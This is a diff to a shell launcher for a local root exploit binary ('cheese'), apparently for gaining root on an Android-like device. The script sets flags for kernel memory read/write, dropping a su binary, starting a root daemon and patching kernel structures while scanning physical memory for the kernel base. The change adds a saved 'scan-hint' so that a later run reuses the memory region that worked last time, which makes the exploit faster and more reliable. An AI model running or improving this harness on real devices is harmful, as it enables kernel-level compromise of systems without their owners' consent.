@@ -158,9 +158,15 @@ else
     ATT=$((ATT+1))
     say "--- 尝试 $ATT/3 ---"
     rm -f $LOG 2>/dev/null; touch $LOG
+    # [ownroot scan-hint] старт с прошлой успешной физбазы; попытка>=2 = полный свип
+    HINT=$(cat $T/scan_hint 2>/dev/null)
+    case "$HINT" in 0x[0-9a-f][0-9a-f]*) ;; *) HINT= ;; esac
+    if [ $ATT -gt 1 ]; then HINT=; rm -f $T/scan_hint 2>/dev/null; fi
+    SCANB=${HINT:-0xa3000000}
+    [ -n "$HINT" ] && say "scan-hint: старт с $HINT (прошлый успешный регион)"
     ( cd $T && env CHEESE_CPURW=1 CHEESE_NO_RETRY=1 CHEESE_DROP_SU=1 \
         CHEESE_ROOT_DAEMON=1 CHEESE_CPURW_VERBOSE=1 CHEESE_PATCH_VR=1 \
-        CHEESE_PHYSCAN_BASE=0xa3000000 CHEESE_PHYSCAN_END=0xae000000 \
+        CHEESE_PHYSCAN_BASE=$SCANB CHEESE_PHYSCAN_END=0xae000000 \
         CHEESE_PHYSCAN_STRIDE=0x1000000 \
         ./cheese > $LOG 2>&1 ) &
     CPID=$!
@@ -188,10 +194,16 @@ else
         sleep 2; kill $CPID 2>/dev/null
         break
       fi
+      # [ownroot scan-hint] промах: 90с без kbase — не жжём 300с (ТОЛЬКО при hint-старте;
+      # обычный полный свип может идти до 300с — не трогаем)
+      if [ -n "$HINT" ] && [ $i -ge 90 ] && ! grep -q 'vr: kbase=' $LOG 2>/dev/null; then
+        say "scan-hint промах (${i}s без kbase) — полный свип следующей попыткой"
+        break
+      fi
     done
     kill $TAILPID 2>/dev/null; kill $CPID 2>/dev/null
     wait $CPID 2>/dev/null
-    if have_root; then OK=1; say "✔ 尝试 $ATT: 提权成功"; break; fi
+    if have_root; then OK=1; echo $SCANB > $T/scan_hint 2>/dev/null; say "✔ 尝试 $ATT: 提权成功 (hint=$SCANB)"; break; fi
     say "尝试 $ATT: 未获得 root (完整日志: $LOG)"
     sleep 3
   done
